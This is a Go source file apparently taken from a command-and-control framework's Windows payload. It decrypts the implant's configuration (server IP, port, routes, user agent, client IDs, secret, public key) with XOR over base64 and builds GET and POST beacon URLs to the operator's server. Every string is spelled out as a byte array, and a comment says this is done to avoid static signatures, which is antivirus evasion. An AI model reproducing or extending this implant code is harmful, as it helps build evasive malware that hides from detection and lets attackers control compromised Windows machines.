// server/docker/payloads/Windows/getEnv.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// GetEnv strings (constructed to avoid static signatures)
var (
	// Map keys for decrypted values
	geKeyUserAgent        = string([]byte{0x55, 0x73, 0x65, 0x72, 0x20, 0x41, 0x67, 0x65, 0x6e, 0x74})                                                                                     // User Agent
	geKeyContentType      = string([]byte{0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x20, 0x54, 0x79, 0x70, 0x65})                                                                         // Content Type
	geKeyCustomHeaders    = string([]byte{0x43, 0x75, 0x73, 0x74, 0x6f, 0x6d, 0x20, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x73})                                                             // Custom Headers
	geKeyGetRoute         = string([]byte{0x47, 0x45, 0x54, 0x20, 0x52, 0x6f, 0x75, 0x74, 0x65})                                                                                           // GET Route
	geKeyPostRoute        = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x52, 0x6f, 0x75, 0x74, 0x65})                                                                                     // POST Route
	geKeyGetMethod        = string([]byte{0x47, 0x45, 0x54, 0x20, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64})                                                                                     // GET Method
	geKeyPostMethod       = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64})                                                                               // POST Method
	geKeyGetClientIDName  = string([]byte{0x47, 0x45, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x4e, 0x61, 0x6d, 0x65})                                     // GET Client ID Name
	geKeyGetClientIDFmt   = string([]byte{0x47, 0x45, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74})                         // GET Client ID Format
	geKeyPostClientIDName = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x4e, 0x61, 0x6d, 0x65})                               // POST Client ID Name
	geKeyPostClientIDFmt  = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x49, 0x44, 0x20, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74})                   // POST Client ID Format
	geKeyPostSecretName   = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x20, 0x4e, 0x61, 0x6d, 0x65})                                                 // POST Secret Name
	geKeyPostSecretFmt    = string([]byte{0x50, 0x4f, 0x53, 0x54, 0x20, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x20, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74})                                     // POST Secret Format
	geKeyPublicKey        = string([]byte{0x50, 0x75, 0x62, 0x6c, 0x69, 0x63, 0x20, 0x4b, 0x65, 0x79})                                                                                     // Public Key
	geKeySecret           = string([]byte{0x53, 0x65, 0x63, 0x72, 0x65, 0x74})                                                                                                             // Secret
	geKeyProtocol         = string([]byte{0x50, 0x72, 0x6f, 0x74, 0x6f, 0x63, 0x6f, 0x6c})                                                                                                 // Protocol
	geKeyIP               = string([]byte{0x49, 0x50})                                                                                                                                     // IP
	geKeyPort             = string([]byte{0x50, 0x6f, 0x72, 0x74})                                                                                                                         // Port

	// HTTP methods
	geMethodGet  = string([]byte{0x47, 0x45, 0x54})       // GET
	geMethodPost = string([]byte{0x50, 0x4f, 0x53, 0x54}) // POST

	// Protocol strings
	geProtoHttps = string([]byte{0x68, 0x74, 0x74, 0x70, 0x73}) // https
	geProtoHttp  = string([]byte{0x68, 0x74, 0x74, 0x70})       // http
	gePort443    = string([]byte{0x34, 0x34, 0x33})             // 443
	gePort80     = string([]byte{0x38, 0x30})                   // 80

	// URL format strings
	geFmtUrlNoPort   = string([]byte{0x25, 0x73, 0x3a, 0x2f, 0x2f, 0x25, 0x73})                   // %s://%s
	geFmtUrlWithPort = string([]byte{0x25, 0x73, 0x3a, 0x2f, 0x2f, 0x25, 0x73, 0x3a, 0x25, 0x73}) // %s://%s:%s
	geFmtUrlQuery    = string([]byte{0x25, 0x73, 0x25, 0x73, 0x3f, 0x25, 0x73, 0x3d, 0x25, 0x73}) // %s%s?%s=%s
	geSlash          = string([]byte{0x2f})                                                       // /
)

func xorDecrypt(encoded, key string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	var result []byte
	for i := 0; i < len(decoded); i++ {
		result = append(result, decoded[i]^key[i%len(key)])
	}

	return string(result), nil
}

func decryptAllValues() map[string]string {
	decrypted := make(map[string]string)

	toDecrypt := map[string]string{
		geKeyUserAgent:        userAgent,
		geKeyContentType:      contentType,
		geKeyCustomHeaders:    customHeaders,
		geKeyGetRoute:         getRoute,
		geKeyPostRoute:        postRoute,
		geKeyGetMethod:        getMethod,
		geKeyPostMethod:       postMethod,
		geKeyGetClientIDName:  getClientIDName,
		geKeyGetClientIDFmt:   getClientIDFormat,
		geKeyPostClientIDName: postClientIDName,
		geKeyPostClientIDFmt:  postClientIDFormat,
		geKeyPostSecretName:   postSecretName,
		geKeyPostSecretFmt:    postSecretFormat,
		geKeyPublicKey:        publicKey,
		geKeySecret:           secret,
		geKeyProtocol:         protocol,
		geKeyIP:               ip,
		geKeyPort:             port,
	}

	for k, v := range toDecrypt {
		decryptedValue, err := xorDecrypt(v, xorKey)
		if err != nil {
			decrypted[k] = ""
		} else {
			decrypted[k] = decryptedValue
		}
	}

	// Set defaults for HTTP methods if they're empty
	if decrypted[geKeyGetMethod] == "" {
		decrypted[geKeyGetMethod] = geMethodGet
	}
	if decrypted[geKeyPostMethod] == "" {
		decrypted[geKeyPostMethod] = geMethodPost
	}

	return decrypted
}

// buildBaseURL constructs the base URL using protocol, IP and port
func buildBaseURL(proto, ipAddr, portNum string) string {
	proto = strings.ToLower(proto)

	// Check if we should omit the port for standard HTTP/HTTPS ports
	if (proto == geProtoHttps && portNum == gePort443) || (proto == geProtoHttp && portNum == gePort80) {
		return fmt.Sprintf(geFmtUrlNoPort, proto, ipAddr)
	}

	return fmt.Sprintf(geFmtUrlWithPort, proto, ipAddr, portNum)
}

// buildGetURL constructs the complete GET URL
func buildGetURL(baseURL, getRouteVal, clientIDName string, clientIDVal string) string {
	if !strings.HasPrefix(getRouteVal, geSlash) {
		getRouteVal = geSlash + getRouteVal
	}

	return fmt.Sprintf(geFmtUrlQuery, baseURL, getRouteVal, clientIDName, clientIDVal)
}

// buildPostURL constructs the complete POST URL
func buildPostURL(baseURL, postRouteVal, clientIDName string, clientIDVal string) string {
	if !strings.HasPrefix(postRouteVal, geSlash) {
		postRouteVal = geSlash + postRouteVal
	}

	return fmt.Sprintf(geFmtUrlQuery, baseURL, postRouteVal, clientIDName, clientIDVal)
}
